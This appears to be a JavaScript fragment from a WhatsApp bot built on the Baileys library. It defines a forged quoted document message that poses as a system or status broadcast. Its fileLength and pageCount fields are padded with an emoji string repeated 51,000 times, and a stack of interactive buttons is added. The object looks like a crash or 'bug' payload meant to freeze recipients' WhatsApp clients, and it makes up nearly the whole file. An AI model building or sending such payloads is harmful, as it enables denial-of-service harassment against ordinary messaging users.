require("../settings")
const { 
generateWAMessageFromContent,
generateWAMessageContent,
proto,
prepareWAMessageMedia,
emitGroupParticipantsUpdate,
emitGroupUpdate,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
GroupMetadata,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
WAGroupMetadata,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WAGroupInviteMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
GroupSettingChange,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
fetchLatestBaileysVersion,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys")
const fs = require("fs")

const from = mek.key.remoteJid

const buttonsss = [];

const typeNullQio = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"documentMessage": {
url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_AlWaYsAqIoo.crash.id.key_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "https://wa.me/settings" + "🫧💧".repeat(51000),
                            pageCount: "https://wa.me/settings" + "🫧💧".repeat(51000),
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "bidadarai",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true,
                            caption: " @Alwaysaqioo ",
                        title: "",
                        hasMediaAttachment: true,
                    body: {
                        text: ""
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'payment_method',
                                buttonParamsJson: "{}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: `{"title":"","sections":[{"title":"","rows":[]}]}`
                            },
                            ...buttonsss,
                            {
                                name: "mpm",
                                buttonParamsJson: "{}"
                            }
                        ]
                    }
}}}